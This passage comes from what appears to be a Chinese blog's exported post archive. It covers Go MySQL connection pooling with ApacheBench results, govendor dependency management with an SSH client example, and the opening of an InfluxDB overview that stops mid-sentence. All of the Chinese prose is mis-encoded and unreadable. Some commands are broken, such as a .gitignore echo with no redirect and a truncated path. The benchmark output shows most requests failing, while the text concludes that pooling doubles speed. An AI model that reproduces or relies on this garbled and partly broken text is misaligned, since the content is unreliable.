func init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping()&#125; æ€§èƒ½å¯¹æ¯”è¿žæŽ¥æ± å¯¹æ€§èƒ½çš„æå‡è¿˜æ˜¯å¾ˆæ˜Žæ˜¾çš„, ä¸‹é¢æˆ‘ä»¬å°±æµ‹è¯•å¯¹æ¯”ä¸€ä¸‹ ä½¿ç”¨è¿žæŽ¥æ± å’Œä¸ä½¿ç”¨è¿žæŽ¥æ± æ—¶çš„æ€§èƒ½å·®åˆ«ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹(ä¸ä½¿ç”¨è¿žæŽ¥æ± æ—¶ æ³¨é‡ŠæŽ‰è¿žæŽ¥æ± ç›¸å…³è®¾ç½®):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( "database/sql" "fmt" "log" "net/http" "time" _ "github.com/go-sql-driver/mysql")var db *sql.DBfunc init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping() createTable() insert()&#125;func main() &#123; startHttpServer()&#125;func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'ç”¨æˆ·ç¼–å·', user_name VARCHAR(45) NOT NULL COMMENT 'ç”¨æˆ·åç§°', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·å¹´é¾„', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·æ€§åˆ«', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'ç”¨æˆ·è¡¨'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125;func insert() &#123; stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125;func queryToMap() []map[string]string &#123; var records []map[string]string rows, err := db.Query("SELECT * FROM user") defer rows.Close() checkErr(err) //å­—å…¸ç±»åž‹ //æž„é€ scanArgsã€valuesä¸¤ä¸ªæ•°ç»„ï¼ŒscanArgsçš„æ¯ä¸ªå€¼æŒ‡å‘valuesç›¸åº”å€¼çš„åœ°å€ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //å°†è¡Œæ•°æ®ä¿å­˜åˆ°recordå­—å…¸ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; records = append(records, record) &#125; return records&#125;func startHttpServer() &#123; http.HandleFunc("/pool", pool) err := http.ListenAndServe(":9090", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125;func pool(w http.ResponseWriter, r *http.Request) &#123; records := queryToMap() fmt.Println(records) fmt.Fprintln(w, "finish")&#125;func checkErr(err error) &#123; if err != nil &#123; fmt.Println(err) panic(err) &#125;&#125; å¸¦è¿žæŽ¥æ± çš„æµ‹è¯•ç»“æžœ:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455âžœ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 0.832 secondsComplete requests: 1000Failed requests: 928 (Connect: 0, Receive: 0, Length: 928, Exceptions: 0)Total transferred: 114144 bytesHTML transferred: 6496 bytesRequests per second: 1201.65 [#/sec] (mean)Time per request: 83.219 [ms] (mean)Time per request: 0.832 [ms] (mean, across all concurrent requests)Transfer rate: 133.95 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 4 4.6 2 18Processing: 8 79 107.2 47 489Waiting: 0 71 107.9 40 488Total: 12 82 106.4 49 491Percentage of the requests served within a certain time (ms) 50% 49 66% 59 75% 67 80% 80 90% 159 95% 394 98% 450 99% 479 100% 491 (longest request) åŽ»é™¤è¿žæŽ¥æ± çš„è®¾ç½®åŽçš„æµ‹è¯•ç»“æžœ:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455âžœ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 1.467 secondsComplete requests: 1000Failed requests: 938 (Connect: 0, Receive: 0, Length: 938, Exceptions: 0)Total transferred: 115374 bytesHTML transferred: 6566 bytesRequests per second: 681.83 [#/sec] (mean)Time per request: 146.664 [ms] (mean)Time per request: 1.467 [ms] (mean, across all concurrent requests)Transfer rate: 76.82 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 1.7 1 19Processing: 8 139 106.8 109 415Waiting: 0 133 110.7 81 415Total: 10 141 107.4 110 418Percentage of the requests served within a certain time (ms) 50% 110 66% 210 75% 237 80% 250 90% 285 95% 321 98% 378 99% 393 100% 418 (longest request) ç»“è®º åŒæ ·çš„å¹¶å‘æƒ…å†µä¸‹, ä½¿ç”¨è¿žæŽ¥æ± æ¯”æ²¡ä½¿ç”¨å¿«ä¸€å€, åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥æ›´æ˜Žæ˜¾ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>go-sql-drive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangåŒ…ç®¡ç†ä¹‹vendor]]></title>
    <url>%2F2017%2F03%2F13%2Fgolang-pkg-management-tool%2F</url>
    <content type="text"><![CDATA[åœ¨ä½¿ç”¨Golangè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªéžå¸¸ä»¤äººå¤´å¤§çš„é—®é¢˜: ç¼ºå°‘ä¾èµ–åº“ç‰ˆæœ¬åŠŸèƒ½ç®¡ç†, æ¯”å¦‚æŸäº›ä¾èµ–åœ¨æŸä¸ªcommitä¹‹åŽå‘ç”Ÿäº†APIå˜æ›´ä¹‹åŽï¼Œå¦‚æžœä¸ä¿®æ”¹ä»£ç å¾ˆéš¾å…¼å®¹ï¼Œç„¶è€Œå¼€å‘è€…ä¹‹é—´å¾ˆæœ‰å¯èƒ½å› ä¸ºå‚ä¸Žçš„æ—¶é—´ä¸åŒï¼Œå¯¼è‡´æ‰§è¡Œgo getå‘½ä»¤èŽ·å–çš„ç‰ˆæœ¬ä¸åŒï¼Œè€Œå¯¼è‡´å„ç§é—®é¢˜, ç”šè‡³æ˜¯ç¼–è¯‘ä¸é€šè¿‡ã€‚å› æ­¤éœ€è¦æœ‰ä¸€ä¸ªåŒ…ä¾èµ–çš„ç‰ˆæœ¬æŽ§åˆ¶å·¥å…·ã€‚ vendorä¹‹å‰åœ¨vendorå‡ºæ¥ä¹‹å‰, ä»¥godepä¸ºä¸»æ¯”è¾ƒæµè¡Œ, godepçš„åŽŸç†éžå¸¸ç®€å•:godepæŠŠç¬¬ä¸‰åŒ…çš„ç‰ˆæœ¬ä¾èµ–ä¿¡æ¯è®°å½•åœ¨Godeps.jsonä¸‹ï¼Œå¹¶ä¸”æŠŠç¬¬ä¸‰åŒ…å®Œæ•´æ‹·è´ä¸€ä»½åˆ°vendorä¸‹é¢ã€‚é€šè¿‡å¯¹Godeps.jsonæ–‡ä»¶è¿›è¡Œç‰ˆæœ¬ç®¡ç†å³å¯ä»¥ç®¡ç†æ•´ä¸ªé¡¹ç›®çš„ç¬¬ä¸‰æ–¹åŒ…ä¾èµ–ä¿¡æ¯ã€‚ å¯ä»¥çœ‹åˆ°godepåªæ˜¯æŠŠç¬¬ä¸‰æ–¹åŒ…è¿›è¡Œå•ç‹¬åˆ°ä¾èµ–ç®¡ç†ï¼Œè€Œæ–°å¢žåˆ°ç¬¬ä¸‰åŒ…è¿˜æ˜¯ä¼šè¢«getåˆ°GOPATHä¸­, å¦‚æžœå¤šä¸ªé¡¹ç›®ç”¨åŒä¸€ä¸ªç¬¬ä¸‰åŒ…çš„ä¸åŒç‰ˆæœ¬æ—¶, é‚£å°±å®Œè›‹äº† vendorçš„åŽ†å²vendoræœºåˆ¶å°±æ˜¯ç”¨æ¥è§£å†³ç¬¬ä¸‰æ–¹åŒ…ä¾èµ–é—®é¢˜: golang 1.5å¼•å…¥, é»˜è®¤æ˜¯å…³é—­çš„, é€šè¿‡æ‰‹åŠ¨è®¾ç½®çŽ¯å¢ƒå˜é‡:GO15VENDOREXPERIMENT=1å¼€å¯ golang 1.6é»˜è®¤å¼€å¯ goalng 1.7 vendorä½œä¸ºåŠŸèƒ½æ”¯æŒ,å–æ¶ˆGO15VENDOREXPERIMENTçŽ¯å¢ƒå˜é‡ vendorçš„åŽŸç†å¾ˆç®€å•: å°†ç¬¬ä¸‰æ–¹ä¾èµ–æ”¾å…¥å½“å‰é¡¹ç›®vendorç›®å½•ä¸­ï¼Œ ç¼–è¯‘çš„æ—¶å€™ä»Žvendorç›®å½•ä¸­æŸ¥æ‰¾ä¾èµ–è€Œä¸ä»ŽGOPATH/srcä¸­å¯¹åº”ç›®å½•ä¸­æŸ¥æ‰¾ã€‚æ–°å¢žçš„ç¬¬ä¸‰æ–¹åŒ…ç›´æŽ¥è¢«getåˆ°æ ¹ç›®å½•çš„vendoræ–‡ä»¶å¤¹ä¸‹,ä¸ä¼šä¸Žå…¶å®ƒçš„é¡¹ç›®æ··ç”¨ç¬¬ä¸‰æ–¹åŒ…ï¼Œå®Œç¾Žé¿å…å¤šä¸ªé¡¹ç›®åŒç”¨åŒä¸€ä¸ªç¬¬ä¸‰æ–¹åŒ…çš„ä¸åŒç‰ˆæœ¬é—®é¢˜ã€‚å› æ­¤åªéœ€è¦å¯¹vendor/vendor.jsonè¿›è¡Œç‰ˆæœ¬æŽ§åˆ¶ï¼Œå³å¯å¯¹ç¬¬ä¸‰åŒ…ä¾èµ–å…³ç³»è¿›è¡ŒæŽ§åˆ¶ã€‚ vendorçš„ä½¿ç”¨æƒ³è¦è¯¦ç»†äº†è§£govendorè¯·å‚è€ƒgovendor å®‰è£…govendor 1go get -u -v github.com/kardianos/govendor åˆ›å»ºä¸€ä¸ªgolangçš„é¡¹ç›® æ¯”å¦‚æˆ‘åˆ›å»ºä¸€ä¸ªç®€å•çš„ä¾èµ–sshæœåŠ¡çš„åŒ…1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String()) åˆå§‹åŒ–vendoræ–‡ä»¶ 12345678910111213âžœ govendor_test govendor initâžœ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;âžœ govendor_test tree ..â”œâ”€â”€ main.goâ””â”€â”€ vendor â””â”€â”€ vendor.json åˆå§‹åŒ–å®ŒæˆåŽä¼šç”Ÿæˆä¸€ä¸ªvendorçš„æ–‡ä»¶å¤¹, å› ä¸ºæˆ‘è¿˜æ²¡æ·»åŠ ä¾èµ–, æ‰€ä»¥vendor.jsoné‡Œé¢å¹¶æ²¡æœ‰ç›¸å…³ä¾èµ–åŒ…çš„æè¿° æ·»åŠ ä¾èµ–çš„ç¬¬ä¸‰æ–¹åŒ… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182âžœ govendor_test govendor add +externalâžœ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [ &#123; &quot;checksumSHA1&quot;: &quot;C1KKOxFoW7/W/NFNpiXK+boguNo=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/curve25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;wGb//LjBPNxYHqk+dcLo7BjPXK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;LXFcVx8I587SnWmKycSDEq9yvK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519/internal/edwards25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;fsrFs762jlaILyqqQImS1GfvIvw=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ssh&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125; ], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;âžœ govendor_test tree ..â”œâ”€â”€ main.goâ””â”€â”€ vendor â”œâ”€â”€ golang.org â”‚ â””â”€â”€ x â”‚ â””â”€â”€ crypto â”‚ â”œâ”€â”€ LICENSE â”‚ â”œâ”€â”€ PATENTS â”‚ â”œâ”€â”€ curve25519 â”‚ â”‚ â”œâ”€â”€ const_amd64.h â”‚ â”‚ â”œâ”€â”€ const_amd64.s â”‚ â”‚ â”œâ”€â”€ cswap_amd64.s â”‚ â”‚ â”œâ”€â”€ curve25519.go â”‚ â”‚ â”œâ”€â”€ doc.go â”‚ â”‚ â”œâ”€â”€ freeze_amd64.s â”‚ â”‚ â”œâ”€â”€ ladderstep_amd64.s â”‚ â”‚ â”œâ”€â”€ mont25519_amd64.go â”‚ â”‚ â”œâ”€â”€ mul_amd64.s â”‚ â”‚ â””â”€â”€ square_amd64.s â”‚ â”œâ”€â”€ ed25519 â”‚ â”‚ â”œâ”€â”€ ed25519.go â”‚ â”‚ â””â”€â”€ internal â”‚ â”‚ â””â”€â”€ edwards25519 â”‚ â”‚ â”œâ”€â”€ const.go â”‚ â”‚ â””â”€â”€ edwards25519.go â”‚ â””â”€â”€ ssh â”‚ â”œâ”€â”€ buffer.go â”‚ â”œâ”€â”€ certs.go â”‚ â”œâ”€â”€ channel.go â”‚ â”œâ”€â”€ cipher.go â”‚ â”œâ”€â”€ client.go â”‚ â”œâ”€â”€ client_auth.go â”‚ â”œâ”€â”€ common.go â”‚ â”œâ”€â”€ connection.go â”‚ â”œâ”€â”€ doc.go â”‚ â”œâ”€â”€ handshake.go â”‚ â”œâ”€â”€ kex.go â”‚ â”œâ”€â”€ keys.go â”‚ â”œâ”€â”€ mac.go â”‚ â”œâ”€â”€ messages.go â”‚ â”œâ”€â”€ mux.go â”‚ â”œâ”€â”€ server.go â”‚ â”œâ”€â”€ session.go â”‚ â”œâ”€â”€ tcpip.go â”‚ â””â”€â”€ transport.go â””â”€â”€ vendor.json9 directories, 36 files æˆ‘ä»¬å‘çŽ°vendor.jsonçš„packageå·²ç»è®°å½•äº†ç¬¬ä¸‰æ–¹åŒ…çš„ç‰ˆæœ¬,å¹¶ä¸”æŠŠè¿™äº›ä¾èµ–çš„åŒ…éƒ½æ”¾åˆ°vendorç›®å½•ä¸‹äº† æ ¹æ®è‡ªå·±çš„éœ€æ±‚,é€‰æ‹©æ˜¯å¦å°†vendorç›®å½•åšç‰ˆæœ¬æŽ§åˆ¶ ä¸€èˆ¬åªéœ€è¦å°†vendor.jsonåšç‰ˆæœ¬æŽ§åˆ¶å³å¯,ä½†æ˜¯å¯¹äºŽé‚£äº›éœ€è¦ç¿»å¢™æ‰èƒ½ä¸‹è½½çš„åŒ…ä¹Ÿå¯ä»¥ç›´æŽ¥å°†vendoréƒ½çº³å…¥ç‰ˆæœ¬æŽ§åˆ¶æ·»åŠ .ignore.gitä»…å¯¹vendor.jsonåšç‰ˆæœ¬æŽ§åˆ¶123456git initecho &quot;vendor/golang.or&quot; .gitignoregit add .git commit -m &quot;test commit&quot;git push -u origin master... å…¶ä»–å°ä¼™ä¼´å®‰è£…ä¾èµ– å…¶ä»–å°ä¼™ä¼´å¦‚æžœéœ€è¦ä½¿ç”¨è¿™ä¸ªé¡¹ç›®, æ‹‰ä¸‹è¯¥é¡¹ç›®12git clone ssh://git@xxx/govendor_test.githttps_proxy=http://localhost:8123 govendor sync (æˆ‘éœ€è¦å®‰è£…golang.orgçš„åŒ…,å› æ­¤éœ€è¦FQ) è¿™æ ·å°±å®‰è£…äº†è¯¥é¡¹ç›®çš„æŒ‡å®šç‰ˆæœ¬çš„ç¬¬ä¸‰ä¸ªä¾èµ–ã€‚æŽ¥ä¸‹æ¥æ„‰å¿«çš„çŽ©è€å§!]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>vendor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ—¶åºæ•°æ®åº“ä¹‹InfluxDB]]></title>
    <url>%2F2017%2F03%2F10%2Fopentsdb-vs-influxdb%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å…¬å¸ä¸šåŠ¡é‡åº¦ä¾èµ–æ—¶åºæ•°æ®åº“, å…¬å¸ä¸Šä¸ªç‰ˆæœ¬é€‰æ‹©äº†OpenTSDB, åœ¨1-2å¹´å‰ï¼Œä»–çš„ç¡®å¾ˆæµè¡Œã€‚ ä½†æ˜¯åœ¨åšè½¯ä»¶é‡æž„æ—¶, ä¸šåŠ¡å±‚åé¦ˆçš„ä¸€äº›é—®é¢˜, OpenTSDBæš‚æ—¶æ— æ³•è§£å†³,æˆä¸ºäº†ä¸€ä¸ªç—›ç‚¹, è®©æˆ‘éœ€è¦è€ƒè™‘å…¶ä»–æ–¹æ¡ˆ, ç”±äºŽä¹‹å‰ä½¿ç”¨è¿‡InfluxDB, ä¹Ÿä¸€ç›´åœ¨å…³æ³¨, å®ƒç»™äº†æˆ‘æƒŠè‰³çš„æ„Ÿè§‰,æ‰€ä»¥è®°å¿†çŠ¹æ–°. èƒŒæ™¯ä¹‹å‰åšè¿ç»´æ—¶,é‡åº¦ä½¿ç”¨è¿‡zabbix, å…³ç³»åž‹æ•°æ®åº“çš„ä¼˜åŒ–,æ ¹æœ¬æ— æ³•è§£å†³é«˜IO, åŽé¢åˆä½¿ç”¨è¿‡Graphite, è¿™ä¸ªå®‰è£…åƒè¿·ä¸€æ ·çš„å·¥å…·, å®ƒåŽç«¯åœ¨RRDä¸Šé¢è®¾è®¡å‡ºäº†ä¸€ä¸ªç®€å•çš„æ—¶åºæ•°æ®åº“, ä½†æ˜¯é…ç½®ç¹æ‚,å®¹é‡å®Œå…¨é è§„åˆ’ã€‚ç›´åˆ°ä½¿ç”¨äº†InfluxDB, éƒ¨ç½²ç®€å•,ä½¿ç”¨æ–¹ä¾¿,é«˜åŽ‹ç¼©, å¯¹å®ƒå°è±¡å¾ˆä¸é”™, ä½†æ˜¯0.12è¿‡åŽä¸æ”¯æŒé›†ç¾¤ã€‚ ä¹‹å‰InfluxDBåˆ‡æ¢äº†2æ¬¡å­˜å‚¨å¼•æ“Ž(å®ƒçš„å­˜å‚¨æ˜¯æ’ä»¶å¼çš„), ä¹Ÿæ²¡åŽ»äº†è§£è¿‡å®ƒåˆ‡æ¢çš„åŽŸå› , ç›´åˆ°çœ‹åˆ°InfoQä¸Šä¸ƒç‰›çš„æ¼”è®²ä»ŽInfluxDBçœ‹æ—¶åºæ•°æ®çš„å¤„, ä»–é“å‡ºäº†äº†åŽŸå› : LevelDBä¸æ”¯æŒçƒ­å¤‡ä»½, influxDBè®¾è®¡çš„shardä¼šæ¶ˆè€—å¤§é‡æ–‡ä»¶æè¿°ç¬¦ï¼Œå°†ç³»ç»Ÿèµ„æºè€—å°½ã€‚ BoltDBè§£å†³äº†çƒ­å¤‡, è§£å†³äº†æ¶ˆè€—å¤§é‡æ–‡ä»¶æè¿°ç¬¦çš„é—®é¢˜, ä½†æ˜¯å¼•å…¥äº†ä¸€ä¸ªæ›´è‡´å‘½çš„é—®é¢˜:å®¹é‡è¾¾åˆ°æ•°GBçº§åˆ«æ—¶,ä¼šäº§ç”Ÿå¤§é‡éšæœºå†™, é€ æˆé«˜IOPSã€‚ æ”¾å¼ƒäº†ä»–ä»¬, åœ¨ä»–ä»¬çš„ç»éªŒä¸Šå¼€å§‹è‡ªå·±å®žçŽ°ä¸€ä¸ªå­˜å‚¨å¼•æ“Ž: TSM(Time-Structured Merge Tree), å®ƒæˆªå–äº†OpenTSDBçš„ä¸€äº›è®¾è®¡ç»éªŒ,æ ¹æ®LSM Treeé’ˆå¯¹æ—¶é—´åºåˆ—æ•°æ®è¿›è¡Œä¼˜åŒ– æˆ‘è®¤ä¸ºåƒè¿™æ ·çš„é’ˆå¯¹ç‰¹æ®Šåœºæ™¯è¿›è¡Œä¼˜åŒ–çš„æ•°æ®åº“ä¼šæ˜¯ä»ŠåŽæ•°æ®åº“é¢†åŸŸå‘å±•çš„ä¸»æµ, å¦ä¸€ä¸ªè¯æ˜Žå°±æ˜¯EleasticSearchä¸€ä¸ªé’ˆå¯¹æ–‡æœ¬è§£ç´¢è€Œè®¾è®¡çš„æ•°æ®åº“, è™½ç„¶OpenTSDBä¹Ÿé’ˆå¯¹æ—¶åºæ•°æ®åšäº†ä¼˜åŒ–,ä½†æ˜¯ç”±äºŽå­˜å‚¨ç³»ç»Ÿä¾ç„¶ä¾èµ–HBase, æ‰€ä»¥åŠ›åº¦ä¸Šé¢æ„Ÿè§‰æ²¡InfluxDBç»™åŠ›ã€‚ ç¤¾åŒºä¸€è·¯èµ°æ¥ä¹‹è‰°è¾›,ä½†æ˜¯å´æ¿€æƒ…æ´‹æº¢,ä»–ä»¬æ˜¯å…ˆè¡Œè€…. æˆ‘å¯¹å®ƒé›†ç¾¤çš„é—­æºå¹¶ä¸åæ„Ÿ, è¿™ç¾¤æ¿€æƒ…æ´‹æº¢çš„äººéœ€è¦æœ‰å•†ä¸šæ”¯æŒã€‚ æ—¶åºæ•°æ®åº“çƒ­åº¦æŽ’åè¿™æ˜¯DB Engineçš„æ—¶åºæ•°æ®åº“2017çš„æŽ’è¡Œæ¦œ, æˆªå›¾æ˜¯2017-3æœˆçš„ï¼Œæœ€æ–°çš„å¯ä»¥ç‚¹DB-Engines Ranking of Time Series DBMSä¸Šå›¾å¯ä»¥çœ‹å‡ºInfluxDBæœ€è¿‘å¾ˆçƒ­, é¢†å…ˆä¼˜åŠ¿æ˜Žæ˜¾ä¸‹é¢æ˜¯å¯¹æ¯”InfluxDB, OpenTSDB, Graphiteçš„å˜åŒ–è¶‹åŠ¿ã€‚å¯¹äºŽä¸€ä¸ªè®¾è®¡ç²¾è‰¯ï¼Œéƒ¨ç½²ç®€å•ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œè€Œä¸”è¿˜é«˜æ€§èƒ½çš„æ—¶åºæ•°æ®åº“è€Œè¨€, æƒ³ä¸çƒ­éƒ½éš¾ã€‚ ç®€ä»‹åŸºäºŽGoè¯­è¨€å¼€å‘ï¼Œç¤¾åŒºéžå¸¸æ´»è·ƒï¼Œé¡¹ç›®æ›´æ–°é€Ÿåº¦å¾ˆå¿«ï¼Œæ—¥æ–°æœˆå¼‚ï¼Œå…³æ³¨åº¦é«˜, 1.0å‘å¸ƒè¿‡åŽ, ç¨³å®šæ€§ä¹Ÿéžå¸¸é«˜ã€‚å®˜æ–¹æ˜¯è¿™æ ·ä»‹ç»InfluxDBçš„ï¼š influxdbæ˜¯ä¸€ä¸ªä»Žåº•å±‚ä¸€æ­¥ä¸€æ­¥æˆé•¿ä¸ºèƒ½å¤„ç†é«˜å†™å…¥,é«˜æŸ¥è¯¢çš„æ—¶åºæ•°æ®åº“, å®ƒä¸“é—¨é’ˆå¯¹æ—¶åºæ•°æ®åšäº†ä¼˜åŒ–,è®©å…¶æ›´é«˜æ€§èƒ½, ä»–å¯ä»¥ç”¨æ¥å­˜å‚¨ä»»ä½•æ—¶åºæ•°æ®, åŒ…æ‹¬DevOpsçš„ç›‘æŽ§ã€åº”ç”¨æŒ‡æ ‡ã€ç‰©è”ç½‘ä¼ æ„Ÿå™¨çš„æ•°æ®, å¹¶å®žæ—¶åˆ†æž è¿™æ˜¯å®ƒgithubä¸Šç»™å‡ºçš„ç‰¹æ€§è¯´æ˜Ž: å†…å»ºHTTP API, æ— éœ€è‡ªå·±å®žçŽ° æ•°æ®é«˜åŽ‹ç¼©, æ”¯æŒéžå¸¸çµæ´»çš„æŸ¥è¯¢è®¿é—® æ”¯æŒç±»SQLæŸ¥è¯¢, å­¦ä¹ æˆæœ¬ä½Ž, æ–¹ä¾¿ä½¿ç”¨ å®‰è£…å’Œç®¡ç†éƒ½ååˆ†ç®€å•, æ•°æ®å†™å…¥å’Œè¯»å–çš„é€Ÿåº¦å¿« ä¸ºå®žæ—¶æŸ¥è¯¢è€Œç”Ÿ, å¯¹æ¯ä¸€ä¸ªç‚¹ä½éƒ½å»ºç«‹ç´¢å¼•, åŠæ—¶æŸ¥è¯¢å“åº”é€Ÿåº¦å°äºŽ100ms ä¸šåŠ¡é—®é¢˜æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ—¶åºæ•°æ®åº“, ä»–éœ€è¦èƒ½è§£å†³æˆ‘ä»¬ä»¥ä¸‹è¿™äº›é—®é¢˜: ä¸€ä¸ªæµ‹è¯•æŒ‡æ ‡å¤šå€¼ä¸€ä¸ªæŒ‡æ ‡å¾€å¾€æœ‰å¤šä¸ªç»´åº¦æ¥æè¿°å…¶å˜åŒ–çŠ¶æ€,å¹¶ä¸ä»…ä»…æ˜¯å€¼, æ¯”å¦‚å¯¹äºŽCPUçš„è€Œè¨€, åº”è¯¥æœ‰ä¸­æ–­ï¼Œè´Ÿè½½, ä½¿ç”¨çŽ‡ç­‰ã€‚ å¤šTagæ”¯æŒtagæ˜¯å¯¹ä¸€ä¸ªæŒ‡æ ‡çš„æè¿°,æ˜¯ä¸€ä¸ªæ ‡ç­¾, åœ¨ä¸šåŠ¡ä¸ŠTagå¯¹äºŽåˆ†ç»„è¿‡æ»¤éžå¸¸æœ‰æ„ä¹‰, ç”¨äºŽæ ‡ç¤ºä¸€ä¸ªæŒ‡æ ‡åœ¨ä¸šåŠ¡ä¸Šçš„æ„ä¹‰, æ¯”å¦‚å¯¹äºŽIOTæ¥è¯´, ä¼ æ„Ÿå™¨çš„æŒ‡æ ‡å¾€å¾€æ˜¯ä¸€ä¸ªæ— æ„ä¹‰çš„id, å› æ­¤éœ€æ±‚ç»™å®ƒæ‰“ä¸Šnameæ ‡ç­¾, æ ‡ç¤ºä»–çš„ç‰¹æ®Šæ„ä¹‰, æ‰“ä¸Šè®¾å¤‡ID, æ ‡ç¤ºå®ƒå±žäºŽå“ªä¸ªè®¾å¤‡, æ‰“ä¸Šä½ç½®æ ‡ç­¾, æ ‡ç¤ºè¯¥æŒ‡æ 